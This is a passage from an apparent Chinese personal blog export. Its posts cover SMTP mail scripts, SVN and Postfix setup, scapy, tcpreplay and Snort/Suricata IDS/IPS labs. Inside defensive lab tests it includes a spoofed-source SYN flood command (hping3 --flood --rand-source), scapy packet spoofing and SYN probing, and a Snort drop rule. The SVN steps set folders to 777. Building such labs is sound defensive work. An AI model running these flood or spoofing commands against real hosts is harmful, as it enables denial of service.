F%91%E9%80%81%EF%BC%8Csmtp%E6%9C%8D%E5%8A%A1%E5%99%A8/ smtp服务器授权 我使用的是126的smtp服务。之前有自己搭建过smtp服务器，但会有两个问题，第一是用腾讯云服务器搭建的话，25端口需要申请，而且不能发邮件，可能封禁。第二就是自己搭建的smtp服务器，发送邮件大概率会被扔进垃圾箱。 126邮箱授权 开启smtp服务 开启成功后，会获得一个授权码，后面会用到。 代码mail_username 是开启smtp服务，并获取到授权码的126邮箱。 mail_auth_password 是开启smtp服务后，获取到的授权码 sender 填写发件人的邮箱地址 def __init__(self): 中的内容，是一些固定的邮件发送需要的参数 sendcontextmail 这个函数，可以把参数去掉，我写这个py的时候，是需要自动获取，定制发送内容。如果不需要参数，可以直接去掉。 123456789101112131415161718192021222324252627282930313233343536373839404142434445import smtplibfrom email.header import Headerfrom email.mime.text import MIMETextfrom email.mime.multipart import MIMEMultipart# 第三方 SMTP 服务class SMTP(): def __init__(self): self.mail_host = &#x27;smtp.126.com&#x27; # 设置服务器 self.mail_username = &#x27;xxxxxxx@126.com&#x27; # 用户名 self.mail_auth_password = &quot;xxxxxxx&quot; # 授权密码 self.sender = &#x27;xxxxxxx@xx.com&#x27; # 发件人邮箱 self.init() def init(self): self.sendcontextmail(&#x27;test&#x27;, &#x27;test&#x27;, &#x27;admin&#x27;) def send_mail(self, receiver, subject, context): &quot;&quot;&quot;使用126邮箱的 smtp 提供邮件支持&quot;&quot;&quot; message = MIMEText(context, &#x27;html&#x27;, &#x27;utf-8&#x27;) message[&#x27;From&#x27;] = self.sender message[&#x27;To&#x27;] = receiver message[&#x27;Subject&#x27;] = Header(subject, &#x27;utf-8&#x27;) try: smtpObj = smtplib.SMTP(self.mail_host, 25) # 生成smtpObj对象，使用非SSL协议端口号25 smtpObj.login(self.mail_username, self.mail_auth_password) # 登录邮箱 smtpObj.sendmail(self.sender, receiver, message.as_string()) # 发送给一人 print(&quot;邮件发送成功&quot;) except smtplib.SMTPException: print(&quot;Error: 无法发送邮件&quot;) def sendcontextmail(self, username, passwd, usergroup): &quot;&quot;&quot;可以自行定制邮件发送的内容&quot;&quot;&quot; self.receiver = &quot;xxxx@xx.com&quot; # 收件人邮箱 usergroup = usergroup.lower() context = &quot;你的 svn 账号信息如下：&lt;/br&gt;&quot; context += &quot;用户名：%s &lt;/br&gt;&quot; % username context += &quot;密码：%s &lt;/br&gt;&quot; % passwd context += &quot;属组：%s &lt;/br&gt;&quot; % str(usergroup) self.send_mail(self.receiver, &quot;邮件主题&quot;, context) # 邮箱发送时的object主题if __name__ == &quot;__main__&quot;: # while True: SMTP().init() 结果","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"smtp","slug":"smtp","permalink":"https://gryffinbit.top/tags/smtp/"},{"name":"python","slug":"python","permalink":"https://gryffinbit.top/tags/python/"}],"author":"Gryffinbit"},{"title":"ubuntu搭建smtp邮件服务器","slug":"ubuntu服务器中搭建smtp邮件服务器","date":"2022-08-15T14:37:17.000Z","updated":"2024-11-12T06:59:10.000Z","comments":true,"path":"2022/08/15/ubuntu服务器中搭建smtp邮件服务器/","permalink":"https://gryffinbit.top/2022/08/15/ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%90%AD%E5%BB%BAsmtp%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"前言ubuntu系统配置相关Blog: 新系统的ubuntu基本配置 环境配置Ubuntu: Ubuntu 20.04.2 ARM64 【parallel虚拟机】 macOS: macOS Monterey. M1, 2020, ARM64【物理机】 ubuntu操作用户：在root用户下进行部署 安装1sudo apt-get install mailutils -y 默认选择第二种：Internet Site，表示直接使用本地SMTP服务器发送和接收邮件； 在第二个页面System mail name中填入你的域名，也就是邮箱地址@符号后面的域名，比如，我想设定的邮箱地址是root@gryffinbit.top. 那我就填入 gryffinbit.top 当发件人的域名地址没有指定时，Postfix会自动将这个域名添加到发件人的地址中。 Postfix在安装过程中会生成&#x2F;etc&#x2F;postfix&#x2F;main.cf配置文件。安装完成后Postfix会自动运行。我们可以用下面的命令查看Postfix的版本。 1sudo postconf mail_version 使用netstat来查看Postfix的监听情况： 1sudo netstat -anptl Postfix的master进程监听TCP 25号端口，在发送测试邮件之前，我们最好是查看25号端口是否被防火墙或主机商屏蔽. 尤其是云服务器，要手动设置，打开端口。 发送邮件1echo &quot;test email&quot; | sendmail your-eamil 成功收到邮件 可能出现的问题阿里云禁用SMTP服务。https://help.aliyun.com/knowledge_detail&#x2F;40680.html?spm&#x3D;5176.2000002.0.0.8a2f4dd7AtOIaJ，在此条文中记载： 3.1.3.5. 不得将阿里云所提供的云服务器用作虚拟服务器、或用作磁盘空间出租，或用作非法代理服务器（Proxy）或邮件服务器（根据阿里云《云平台安全规则》，未经报备许可云服务器不得用于连接SMTP服务发送邮件，阿里云默认将禁止云服务器用于SMTP服务）； 参考资料https://www.jianshu.com/p/f438aa21069e","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"https://gryffinbit.top/tags/ubuntu/"},{"name":"smtp","slug":"smtp","permalink":"https://gryffinbit.top/tags/smtp/"}],"author":"Gryffinbit"},{"title":"ubuntu搭建svn服务器","slug":"ubuntu服务器中搭建svn","date":"2022-08-15T09:54:07.000Z","updated":"2024-11-12T06:59:09.000Z","comments":true,"path":"2022/08/15/ubuntu服务器中搭建svn/","permalink":"https://gryffinbit.top/2022/08/15/ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%90%AD%E5%BB%BAsvn/","excerpt":"","text":"前言ubuntu系统配置相关Blog: 新系统的ubuntu基本配置 环境配置Ubuntu: Ubuntu 20.04.2 ARM64 【parallel虚拟机】 macOS: macOS Monterey. M1, 2020, ARM64【物理机】 ubuntu操作用户：在root用户下进行部署 安装1234567891011sudo apt-get install subversion -y# 在home下创建 svn文件夹mkdir /home/svn# 在svn文件夹中创建project文件夹mkdir /home/svn/project# 将svn文件夹权限设置为 777chmod -R 777 /home/svn 解决一个warning 1234567locale -asudo dpkg-reconfigure localessudo vim /etc/locale.gen# 添加一行en_US.UTF-8 UTF-8sudo locale-genexport LC_ALL=C warning消失 12345# 创建svn仓库svnadmin create /home/svn/project# 将db文件夹权设置为 777chmod -R 777 /home/svn/project/db 配置svn相关 1cd /home/svn/project/conf （其中svnserve.conf是服务器配置，authz是用户的读写权限设置，passwd是设置用户和密码） 修改svn服务器配置 12cd /home/svn/project/confvim svnserve.conf 打开注释，注意开头不要有空格 相对路径 修改passwd配置 12cd /home/svn/project/confvim passwd 设置svn用户名密码 格式按照如上图所示 修改authz 12cd /home/svn/project/confvim authz 添加管理员、以及权限 启动先停止进程 1killall svnserve 启动svn 1svnserve -d -r /home/svn/ 查看svn进程 1ps -ef|grep svnserve 注意svn的端口号不会默认开启，腾讯云服务器上装svn时，所以要手动开启3690端口。 查看已经开启的端口 1sudo ufw status 打开端口 1sudo ufw allow 3690 开启防火墙 1sudo ufw enable 重启防火墙 1sudo ufw reload 再次查看一下端口是否已开放 1sudo ufw status 客户端mac 1brew install svn 1svn checkout svn://[svn服务器ip] --username=admin 参考文章https://segmentfault.com/a/1190000022713946","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"https://gryffinbit.top/tags/ubuntu/"},{"name":"svn","slug":"svn","permalink":"https://gryffinbit.top/tags/svn/"}],"author":"Gryffinbit"},{"title":"scapy使用","slug":"scapy使用","date":"2022-08-12T14:35:33.000Z","updated":"2024-11-12T06:59:22.000Z","comments":true,"path":"2022/08/12/scapy使用/","permalink":"https://gryffinbit.top/2022/08/12/scapy%E4%BD%BF%E7%94%A8/","excerpt":"","text":"scapy 介绍scapy是一个可以让用户发送、侦听和解析并伪装网络报文的python程序。这些功能可以用于制作侦测、扫描和攻击网络的工具。 scapy是一个强大的操纵报文的交互程序。可以伪造或者解析多种协议的报文，还具有发送、捕获、匹配请求和响应这些报文以及更多的功能。 centos 安装scapy1234dnf install python3yum install python3-develpip install scapypip install matplotlib pyx cryptography -i https://pypi.tuna.tsinghua.edu.cn/simple 运行 1scapy 生成数据包12345678910# 使用Ether()方法生成一个以太网层数据包eth_packet = Ether()# 使用IP()方法生成一个网络层数据包ip_packet = IP()# 使用TCP()方法生成一个tcp数据包tcp_packet = TCP()# 使用UDP()方法生成一个udp数据包udp_packet = UDP()# 使用ICMP()方法生成一个udp数据包icmp_packet = ICMP() 查看数据包内容1234567891011121314# 使用IP()方法生成一个tcp数据包ip_packet = IP()# 方法一、使用raw()方法查看raw(ip_packet)# 方法二、使用hexdump()查看。类似Wiresharkhexdump(ip_packet)# 方法三、raw()配合协议类查看。最佳# 查看该数据包以太网层内容（下层内容不层示，上层内容不解析只以load形式展示）Ether(raw(ip_packet))# 查看该数据包网络层内容（下层内容不层示，上层内容不解析只以load形式展示）IP(raw(ip_packet)) 自定义字段值 定义字段的值有两种方法，一种是在构造时直接传递参数，另一种是在生成后重新赋值；至于参数名即是上一小节中打出的那些项。 12345678910111213# 方法一，在构造时直接传递参数# 给src传值10.10.6.92，ttl传值128；字段为字符的以字符串形式传，字段为数值的以数值形式传ip_packet = IP(src=&quot;10.10.6.92&quot;,ttl=128)# 查看数据包各项值，确认src项是否为10.10.6.92，ttl项是否为128IP(raw(ip_packet))# 方法二，在生成后重新赋值# 给src赋值10.10.6.92，ttl赋值128；字段为字符的以字符串形式赋，字段为数值的以数值形式赋ip_packet.src = &quot;10.10.6.93&quot;ip_packet.ttl = 200# 查看数据包各项值，确认src项是否为10.10.6.93，ttl项是否为200IP(raw(ip_packet)) 同时自定义多层协议的字段1234567891011121314# 构造一个IP数据包，源mac设置为&quot;14:98:77:72:7f:6c&quot;，源ip设置为&quot;10.10.6.92&quot;ip_packet = Ether(src=&quot;14:98:77:72:7f:6c&quot;)/IP(src=&quot;10.10.6.92&quot;)# 当前构造函中最低层为EtherEther(raw(ip_packet))# 定义一个TCP数据包，源mac设置为&quot;00:00:00:00:00:11&quot;，源ip设置为&quot;10.10.6.92&quot;，源端口设置为1234tcp_packet = Ether(src=&quot;14:98:77:72:7f:6c&quot;)/IP(src=&quot;10.10.6.92&quot;)/TCP(sport=1234)# 当前构造函中最低层为EtherEther(raw(tcp_packet))# 定义一个应用层数据包，应用层内容为&quot;GET / HTTP/1.0\\r\\n\\r\\n&quot;app_packet = IP()/TCP()/&quot;GET / HTTP/1.0\\r\\n\\r\\n&quot;# 当前构造函中最低层为IPIP(raw(app_packet)) 发送和接收数据包只发送数据包不接收数据包 send()函数允许自定义网络层，sendp()函数允许自定义以太网层。 123send(IP(src=&quot;172.10.1.2&quot;,dst=&quot;10.211.55.2&quot;)/ICMP())sendp(Ether()/IP(src=&quot;172.10.1.2&quot;,dst=&quot;10.211.55.2&quot;)/ICMP()) 虚拟机给物理机发包，网口是bridge100 虚拟机scapy发送成功，抓包捕获该数据包进行确认 发送并接收响应数据包 sr1()函数允许自定义网络层，srp()函数允许自定层数据链路层 12rec_packet = sr1(IP(dst=&quot;10.211.55.2&quot;)/ICMP()/&quot;hello world&quot;)rec_packet syn扫描 把Flags字段明确指定为SYN 12rec_packet = sr1(IP(dst=&quot;192.168.0.89&quot;)/TCP(dport=80,flags=&quot;S&quot;))rec_packet.show() 参考文章scapy中文文档 https://www.cnblogs.com/lsdb/p/10496171.html","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"工具","slug":"入侵检测/工具","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"scapy","slug":"scapy","permalink":"https://gryffinbit.top/tags/scapy/"}],"author":"Gryffinbit"},{"title":"tcpreplay进行流量包回放","slug":"tcpreplay进行流量包回放","date":"2022-07-29T15:57:02.000Z","updated":"2024-11-12T06:59:11.000Z","comments":true,"path":"2022/07/29/tcpreplay进行流量包回放/","permalink":"https://gryffinbit.top/2022/07/29/tcpreplay%E8%BF%9B%E8%A1%8C%E6%B5%81%E9%87%8F%E5%8C%85%E5%9B%9E%E6%94%BE/","excerpt":"","text":"概述Tcpreplay 是一套免费的开源使用程序集合，用于编辑和重放以前捕获的网络数据流量。最初的目标是重放恶意流量到入侵检测防御系统。现在有更多的用途，例如重放报文到Web服务器。 工具 Tcpreplay是多个工具的集合，其中的tcpreplay用于流量包的回放 tcpreplay 是一种pcap包的重放工具，可以将tcpdump和wireshark等工具捕捉到的网络流量包进行重放。通过重放网络流量包从而实现复现问题情景以定位bug。tcperplay可以以任意速度将pcap文件重播到网络上 tcpreplay的发包机制 所谓回放数据包的意思就是，将这个数据包的流向再次重现，也就是说再把这个数据包的流向走一遍。所以tcpreplay是检测数据包的包头的内容里面的源、目的地端的内容，目的端的地址是多少就发往哪里，知道这个我们就清楚我们在使用tcpreplay重放的时候，各种数据包都流向了哪里，这个时候只需要拿wireshark拦截，就可以很清楚的看到各种数据包。 tcpreplay做不到服务端能实时响应的回放 使用Tcpreplay回放Pcap流量，Tcpreplay只能保证发出去，如果想要服务端响应的话，需要使用tcpliveplay(使用tcpreplay回放tcp的时候，不能同步TCP里面Syn&#x2F;Ack的编号)。 在Tcpreplay服务端只能抓到单方向的流量 tcpreplay回放只是把数据包发出去，数据包去往何处，根据的是目标地址。对于客户端-&gt;服务端的流量，目标为服务端，所以这个方向的流量会发往服务端。而对于服务端-&gt;客户端的流量，此时目标为客户端，所以这个方向的流量，不会发往服务端，而是在客户端。 修改MAC地址的注意事项 对于不属于同一局域网下的两台主机，修改目的IP的MAC地址的时候，MAC地址不是目的机网卡物理地址，而是源机器所连接的交换机MAC地址。 关于tcpreplay发包的错误积累 Warning: Unable to send packet: Error with PF_PACKET send() [8]:Message too long (errno = 90) 此错误往往是由于网卡链路的MTU造成，可以重新设置更大的MTU即可。 1ifconfig &lt;网卡&gt; mtu 3000 安装CentOS：CentOS-Stream-9-latest-aarch64-dvd1 【服务器端】 Kali: Kali Linux 2021.3 ARM64【客户端】 centos 服务器端 123dnf install epel-release -ydnf install tcpreplay -ydnf install tcpdump Kali客户端 123sudo apt-get install tcpreplay -ysudo apt-get install tcpdumpsudo apt-get install netcat-openbsd 查找nc whereis nc 确定&#x2F;usr&#x2F;bin&#x2F;nc中是软链接（也阔以不）ls -l /usr/bin/nc 删除原软链接，重建 12sudo rm /usr/bin/ncsudo ln -s /opt/netcat/bin/nc /usr/bin/nc 使用–help查看nc命令是否已经改为netcat了（同理也阔以将&#x2F;usr&#x2F;bin&#x2F;netcat中的链接指向nc） 1nc --help 使用 kali对centos发起ping包，centos用Wireshark抓取并保存为test.pcap 在centos，重放 1tcpreplay -i enp0s5 test.pcap 再次抓包，可以看到有刚刚的ping包 参考文章 nc无法连接 Ncat: Connection refused. tcpreplay回放流量遇到的坑","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"工具","slug":"入侵检测/工具","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"tcpreplay","slug":"tcpreplay","permalink":"https://gryffinbit.top/tags/tcpreplay/"}],"author":"Gryffinbit"},{"title":"centos-stream-9 安装配置suricata【IPS、IDS模式】","slug":"centos-stream-9-安装suricata","date":"2022-07-28T15:13:50.000Z","updated":"2024-11-12T06:59:49.000Z","comments":true,"path":"2022/07/28/centos-stream-9-安装suricata/","permalink":"https://gryffinbit.top/2022/07/28/centos-stream-9-%E5%AE%89%E8%A3%85suricata/","excerpt":"","text":"前言centos-stream-9的配置跳转blog：centos-stream9arm基础配置 简介Suricata是一个免费、开源、成熟、快速且强大的网络威胁检测引擎。可以被用作IDS引擎（只能检测不能阻断）、IPS（可以检测也可以阻断）、网络安全监控、离线pcap处理工具。 Suricata 使用强大而广泛的规则和签名语言检查网络流量，并具有强大的 Lua 脚本支持以检测复杂威胁。 环境配置CentOS: CentOS-Stream-9, ARM, Parallels虚拟机 CentOS操作用户：在root用户下进行suricata 部署 CentOS源：阿里源 依赖安装安装依赖 1234dnf makecachednf clean alldnf install epel-release -ydnf update -y 1dnf install diffutils file-devel gcc jansson-devel make nss-devel libyaml-devel libcap-ng-devel libpcap-devel pcre-devel python3 python3-pyyaml rust-toolset zlib-devel curl wget tar lua lua-devel lz4-devel -y 报错 Unable to find a match: file-devel、 jansson-devel、libyaml-devel、lua-devel 添加CRB仓库 1vim /etc/yum.repos.d/centos.repo 最后一行加入 12345678[crb]name = =CentOS-$releasever - CRB - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 12dnf makecacheyum makecache 用crb下载 1dnf --enablerepo=crb install &lt;包名&gt; -y 可以通过https://pkgs.org/来查看要下载的包，是属于哪个仓库源的 1dnf --enablerepo=crb install file-devel jansson-devel libyaml-devel lua-devel -y 安装suricata1dnf install suricata 安装成功 12systemctl start suricatasystemctl enable suricata 修改配置、规则修改配置 1vim /etc/suricata/suricata.yaml 添加IP（本机IP）、网口（需要探测的网卡,enp0s5）、nfq（为了能开启IPS） 更新规则 1suricata-update 测试kali发起flood攻击 截图左边是centos，右边是kali。kali对centos发起攻击 先不开启suricata，用wireshark抓包看一下流量的走向 可以看到收到了很多的icmp包，伪装成了不同的IP。kali多攻击一会，Wireshark直接崩溃了🐶 启用suricata，IDS模式 开启IDS模式，仅能检测攻击，不能拦截 1suricata -c /etc/suricata/suricata.yaml -i enp0s5 启用suricata，IPS模式 开启IPS模式，可以检测也可以拦截。 查看Suricata是否支持IPS模式 1suricata --build-info 如果输出有： NFQueue support: yes 表示支持IPS模式 -q让Suricata以IPS模式运行，相当于snort的inline模式。不过还需要设置一下iptables的NFQUEUE，让Suricata能访问到相应的数据包，最简单的方法是： 12iptables -I INPUT -p tcp -j NFQUEUEiptables -I OUTPUT -p tcp -j NFQUEUE 1suricata -c /etc/suricata/suricata.yaml -q 0 suricata用完之后，再清除这个规则，不然会影响正常通信 1iptables -F 参考文章https://suricata.io/ https://suricata.readthedocs.io/en/latest/ https://suricata.readthedocs.io/en/latest/install.html https://www.digitalocean.com/community/tutorials/how-to-install-suricata-on-centos-8-stream https://bynss.com/linux/761151.html https://suricata.readthedocs.io/en/latest/quickstart.html https://suricata.readthedocs.io/en/suricata-6.0.0/setting-up-ipsinline-for-linux.html https://blog.csdn.net/Chaowanq/article/details/121563114 https://maskray.me/blog/2013-07-26-ids-ips-with-suricata","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"suricata","slug":"入侵检测/suricata","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/suricata/"}],"tags":[{"name":"suiricata","slug":"suiricata","permalink":"https://gryffinbit.top/tags/suiricata/"}],"author":"Gryffinbit"},{"title":"ARM安装Perl环境","slug":"ARM安装Perl环境","date":"2022-07-27T11:10:31.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/07/27/ARM安装Perl环境/","permalink":"https://gryffinbit.top/2022/07/27/ARM%E5%AE%89%E8%A3%85Perl%E7%8E%AF%E5%A2%83/","excerpt":"","text":"环境macOS Monterey，M1，2020. version 12.4 perl 5, version 32, subversion 1 (v5.32.1) built for aarch64-linux-thread-multi 安装perl12345678910111213141516171819202122232425262728293031323334yum install perl-Perl4-CoreLibsdnf install cpan# 由内建的cpan工具安装perlbrew，与内建的perl关联echo &quot;yes&quot; | sudo cpan App::perlbrew# 初始化，在用户家目录下导入必备的环境变量等等perlbrew init# 导入当前perlbrew的环境变量，为了确保我将它写在了~/.bashrc里source ~/perl5/perlbrew/etc/bashrc cat ~/perl5/perlbrew/etc/bashrc &gt;&gt; ~/.bashrc # 查看现在可用的所有perl版本perlbrew available # 下载并安装对应的版本，它会默认安装到~/perl5目录下，并且以版本号区分好，真正引用的时候可以用perlbrew非常方便的切换perlbrew install perl-5.36.0# 下载速度很慢，我在网页上下载好后移到了这个指定路径# Fetching perl 5.36.0 as /root/perl5/perlbrew/dists/perl-5.36.0.tar.gz Download https://cpan.metacpan.org/authors/id/R/RJ/RJBS/perl-5.36.0.tar.gz to /root/perl5/perlbrew/dists/perl-5.36.0.tar.gzmv perl-5.36.0.tar.gz /root/perl5/perlbrew/dists/perl-5.36.0.tar.gz # 查看已安装在本地的perl列表perlbrew list # 设置默认使用的perl版本，注意，这个不影响apt-get命令，因为所有的bin/lib都是与其分开的perlbrew switch perl-5.36.0 # 暂时切换使用的perl版本，比如在一个shell脚本里，切换完成后，你可以查看perl当前的版本是否对应perlbrew use perl-5.8.1perl -v# 用perlbrew管理下载cpanperlbrew install-cpanm 参考文章https://kunpengcompute.github.io/2020/11/27/zai-arm-ping-tai-shang-wan-zhuan-perl/","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"ARM","slug":"ARM","permalink":"https://gryffinbit.top/tags/ARM/"},{"name":"Perl","slug":"Perl","permalink":"https://gryffinbit.top/tags/Perl/"}],"author":"Gryffinbit"},{"title":"snort+iptables实现数据包阻断功能","slug":"snort-iptables实现数据包阻断功能","date":"2022-07-26T11:13:27.000Z","updated":"2024-11-12T06:59:21.000Z","comments":true,"path":"2022/07/26/snort-iptables实现数据包阻断功能/","permalink":"https://gryffinbit.top/2022/07/26/snort-iptables%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8C%85%E9%98%BB%E6%96%AD%E5%8A%9F%E8%83%BD/","excerpt":"","text":"前言整个SNAT环境实现的搭建，跳转Blog： SNAT共享上网 在centos-stream-9上安装snort2.9，跳转Blog： centos-stream-9下安装snort2-9【arm虚拟机版】 snort2.9规则集配置，跳转Blog： centos-stream-9 snort2.9规则集配置 环境配置CentOS: CentOS-Stream-9, ARM, 【Parallels虚拟机，NAT，防火墙】 CentOS操作用户：在root用户下进行snort部署 CentOS的 iptables版本：iptables v1.8.8 (nf_tables) Ubuntu: Ubuntu 20.04.2 ARM64 【client内网客户机】 snort版本：snort-2.9.20 daq版本： daq-2.0.7 CentOS源：阿里源 规则集版本： 29200 Tips: 注意！规则集和snort版本要对应上，因为不同版本的可能会有一些新规则不能匹配上，就不能顺利运行。参考官网，每个新版本的说明，包括规则集的说明： 规则集 版本说明 snort+iptables实现IPS的功能说明snort是一个IDS，只能实现检测不能阻断数据包 iptables可以拦截数据包。 所以用snort+iptables共同使用，来实现数据包的阻断功能。充当IPS。 但是通常iptables是写死的。就把数据包一直拦截，不管有没有这个包 此次实验。就是让snort的IDS和iptables一起联动。使得snort开启IDS检测时，只有被检测到了规则里的数据包，它才会自动让iptables拦截。 测试 Snort+iptables 实现IPS功能【手动iptables添加】 将enp0s5开启外网网卡。snort.conf HOME_NET需要修改 此时enp0s5，是共享网络模式，可以访问外网，可以和一个电脑下其他虚拟机进行通信。ip地址为10.211.55.12 （其实开不开都可以，只要满足HOME_NET和网卡的IP是对应的就可以） 在snort里加入规则 1vim /etc/snort/rules/local.rules 下面的规则，意思就是丢弃ping包 1drop icmp any any -&gt; $HOME_NET any (msg:&quot;ICMP test&quot;; sid:10000001; rev:001;) 启动snort 1snort -Q --daq nfq --daq-var device=enp0s5 --daq-var queue=1 -u snort -g snort -c /etc/snort/snort.conf -A console Iptables 添加规则【开启另外一个shell】 1iptables -I INPUT -j NFQUEUE --queue-num 1 --queue-bypass kali进行ping的行为 当snort未开启，且未加入iptables规则时。kali可以成功的ping通10.211.55.12 当snort开启，且加入iptables规则时。kali无法ping通10.211.55.12 当snort开启，但没有加入iptables规则时。kali 可以ping通10.211.55.12 。但snort不能检测到 安装配置guardian 在官网下载脚本 下载链接 官网链接 将下载的文件放到snortfile文件夹 123# 通过物理机scp将文件传到了/root下# 解压到snortFiletar -zxvf guardian-1.7.tar.gz -C snortFile/ 创建guardian文件夹 12345678cd snortFile/guardian-1.7/touch /etc/snort/guardian.ignoretouch /etc/snort/guardian.targettouch /var/log/snort/guardian.logcp guardian.pl /usr/local/bin/cp scripts/iptables_block.sh /usr/local/bin/guardian_block.shcp scripts/iptables_unblock.sh /usr/local/bin/guardian_unblock.shcp guardian.conf /etc/snort 编辑guardian配置文件 1vim /etc/snort/guardian.conf 网卡选择了nat server连接内网的网卡 12345678HostIpAddr 10.211.55.12Interface enp0s5LogFile /var/log/snort/guardian.logAlertFile /var/log/snort/alert //alert文件的位置IgnoreFile /etc/snort/guardian.ignore //白名单targetFile /etc/snort/guardian.target //黑名单TimeLimit 120 //阻断时间,以秒为单位 启动guardian 1/usr/bin/perl /usr/local/bin/guardian.pl -c /etc/snort/guardian.conf 执行perl文件 报错 （ARM架构）报错问题参见另外一篇Blog：https://gryffinbit.top/2022/07/27/arm%E5%AE%89%E8%A3%85perl%E7%8E%AF%E5%A2%83/ 临时解决方案见：https://stackoverflow.com/questions/47990911/which-module-do-i-need-when-i-got-error-info-cant-locate-getopts-pl-in-inc 1&gt;perl -I /usr/lib/libperl4-corelibs-perl /usr/bin/perl /usr/local/bin/guardian.pl -c /etc/snort/guardian.conf 测试 Snort+iptables 实现IPS功能【guardian自动化】 在snort里加入规则 1vim /etc/snort/rules/local.rules 1drop icmp any any -&gt; $HOME_NET any (msg:&quot;ICMP test&quot;; sid:10000001; rev:001;) 启动snort 1snort -A fast -i enp0s5 -u snort -g snort -c /etc/snort/snort.conf 快速报警模式，将告警信息简单的写入警报 12cd /var/log/snorttail -f alert 启动guardian 1/usr/bin/perl /usr/local/bin/guardian.pl -c /etc/snort/guardian.conf 攻击机发起攻击 使用kali对10.37.129.1发起扫描进攻 发起tcp攻击（flood攻击） 1hping3 --flood -S --rand-source 10.37.129.1 参考文章guardian perl报错修复 libperl4-corelibs-perl 安装 http://www.qfrost.com/undefined/snort/ https://blog.csdn.net/hexf9632/article/details/98200876","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"入侵检测/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"centos-stream-9","slug":"centos-stream-9","permalink":"https://gryffinbit.top/tags/centos-stream-9/"},{"name":"ARM架构","slug":"ARM架构","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallels虚拟机","slug":"parallels虚拟机","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"guardian","slug":"guardian","permalink":"https://gryffinbit.top/tags/guardian/"}],"author":"Gryffinbit"},{"title":"centos-stream-9 snort2.9规则集配置","slug":"centos-stream-9-snort2-9规则集配置","date":"2022-07-25T16:53:10.000Z","updated":"2024-11-12T06:59:48.000Z","comments":true,"path":"2022/07/26/centos-stream-9-snort2-9规则集配置/","permalink":"https://gryffinbit.top/2022/07/26/centos-stream-9-snort2-9%E8%A7%84%E5%88%99%E9%9B%86%E9%85%8D%E7%BD%AE/","excerpt":"","text":"前言在centos-stream-9上安装snort2.9，跳转Blog： centos-stream-9下安装snort2-9【arm虚拟机版】 环境配置CentOS: CentOS-Stream-9, ARM, Parallels虚拟机 CentOS操作用户：在root用户下进行snort部署 snort版本：snort-2.9.20 daq版本： daq-2.0.7 CentOS源：阿里源 规则集版本： 29200 Tips: 注意！规则集和snort版本要对应上，因为不同版本的可能会有一些新规则不能匹配上，就不能顺利运行。参考官网，每个新版本的说明，包括规则集的说明： 规则集 版本说明 snort工作模式、配置文件介绍snort工作模式、配置文件 Blog跳转链接： snort的工作模式 snort配置文件（定义、使用变量） 配置snort更新共享库 1sudo ldconfig 创建符号连接 snort被安装到 /usr/local/bin/snort 创建符号链接到 /usr/sbin/snort 1sudo ln -s /usr/local/bin/snort /usr/sbin/snort 创建snort用户 12groupadd snortuseradd snort -r -s /sbin/nologin -c SNORT_IDS -g snort 参数说明： -r：创建一个系统账户 -s：用户登录后使用的shell名称（默认值不填写，这样系统会指定预设的登入shell，根据&#x2F;etc&#x2F;default&#x2F;useradd预设值）【sbin&#x2F;nologin 代表这个用户无法使用bash或其他shell来登陆系统，即使给了密码也不行，但是可以使用系统资源。只是不能登陆主机而已。】 -g：group名称【添加到snort组下】 -c：comment，注释说明栏 创建snort文件夹 创建snort文件夹用以存放snort配置文件 123mkdir -p /etc/snort/rulesmkdir /var/log/snortmkdir /usr/local/lib/snort_dynamicrules 给文件夹赋予权限 123456chmod -R 5775 /etc/snortchmod -R 5775 /var/log/snortchmod -R 5775 